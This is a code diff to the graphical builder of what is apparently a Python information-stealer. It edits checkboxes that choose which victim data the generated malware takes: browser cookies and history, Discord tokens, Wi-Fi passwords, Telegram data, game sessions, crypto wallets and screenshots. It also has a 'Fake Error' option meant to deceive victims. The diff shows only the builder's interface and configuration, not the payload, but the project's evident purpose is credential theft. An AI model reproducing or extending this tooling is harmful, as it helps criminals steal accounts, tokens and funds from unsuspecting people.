@@ -67,8 +67,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.captureCookiesVar = ctk.BooleanVar(self)
 		self.captureHistoryVar = ctk.BooleanVar(self)
 		self.captureDiscordTokensVar = ctk.BooleanVar(self)
-		self.captureMinecraftVar = ctk.BooleanVar(self)
-		self.captureRobloxCookiesVar = ctk.BooleanVar(self)
+		self.captureGamesVar = ctk.BooleanVar(self)
 		self.captureWifiPasswordsVar = ctk.BooleanVar(self)
 		self.captureSystemInfoVar = ctk.BooleanVar(self)
 		self.captureScreenshotVar = ctk.BooleanVar(self)
@@ -120,11 +119,11 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		captureDiscordTokens = ctk.CTkCheckBox(self, text= "Discord Tokens", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureDiscordTokensVar)
 		captureDiscordTokens.grid(row= 1, column= 2, sticky= "w", padx= 20)
 
-		captureMinecraft = ctk.CTkCheckBox(self, text= "Minecraft Sessions", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureMinecraftVar)
-		captureMinecraft.grid(row= 2, column= 2, sticky= "w", padx= 20)
+		captureGames = ctk.CTkCheckBox(self, text= "Games", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureGamesVar)
+		captureGames.grid(row= 2, column= 2, sticky= "w", padx= 20)
 
-		captureRobloxCookies = ctk.CTkCheckBox(self, text= "Roblox Cookies", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureRobloxCookiesVar)
-		captureRobloxCookies.grid(row= 3, column= 2, sticky= "w", padx= 20)
+		captureWallets = ctk.CTkCheckBox(self, text= "Wallets", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureWalletsVar)
+		captureWallets.grid(row= 3, column= 2, sticky= "w", padx= 20)
 
 		captureWifiPasswords = ctk.CTkCheckBox(self, text= "Wifi Passwords", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureWifiPasswordsVar)
 		captureWifiPasswords.grid(row= 4, column= 2, sticky= "w", padx= 20)
@@ -137,9 +136,6 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 		captureTelegram = ctk.CTkCheckBox(self, text= "Telegram", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureTelegramVar)
 		captureTelegram.grid(row= 3, column= 3, sticky= "w", padx= 20)
-
-		captureWallets = ctk.CTkCheckBox(self, text= "Wallets", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureWalletsVar)
-		captureWallets.grid(row= 4, column= 3, sticky= "w", padx= 20)
 
 		fakeError = ctk.CTkCheckBox(self, text= "Fake Error", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", command= self.fakeError_Event, variable= self.fakeErrorVar)
 		fakeError.grid(row= 1, column= 4, sticky= "w", padx= 20)
@@ -236,8 +232,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
         		"captureCookies" : self.captureCookiesVar.get(),
         		"captureHistory" : self.captureHistoryVar.get(),
         		"captureDiscordTokens" : self.captureDiscordTokensVar.get(),
-        		"captureMinecraftSessionFiles" : self.captureMinecraftVar.get(),
-        		"captureRobloxCookies" : self.captureRobloxCookiesVar.get(),
+				"captureGames" : self.captureGamesVar.get(),
         		"captureWifiPasswords" : self.captureWifiPasswordsVar.get(),
         		"captureSystemInfo" : self.captureSystemInfoVar.get(),
         		"captureScreenshot" : self.captureScreenshotVar.get(),
@@ -468,7 +463,7 @@ if __name__ == "__main__":
 			subprocess.Popen(f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Your Python version is {version} but version 3.10+ is required. Please update your Python installation!\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
 			exit(1)
 		if "windowsapps" in sys.executable.lower():
-			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Looks like you installed Python from Windows Store instead of the official website https://python.org. Please disable/uninstall it and reinstall from the website.\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
+			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'It looks like you installed Python from Windows Store instead of using the official website https://python.org. Please disable/uninstall it and reinstall from the website.\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
 			exit(1)
 	
 		Utility.ToggleConsole(False)
